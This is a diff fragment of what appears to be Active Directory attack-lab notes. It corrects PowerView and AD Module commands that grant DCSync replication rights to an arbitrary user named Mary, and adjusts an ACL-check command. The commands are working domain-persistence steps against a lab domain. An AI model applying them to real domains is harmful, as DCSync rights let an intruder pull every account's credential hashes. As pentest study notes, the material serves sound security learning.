@@ -360,13 +360,13 @@ misc::skeleton
 #### Domain Replication Privileges 
 •  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
 
-```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' - PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
+```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
 
 ```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
 
 #### Check ACLs
 NOT WORKING!!
-```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Josh'}```
+```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Mary'}```
 
 try:
 ```
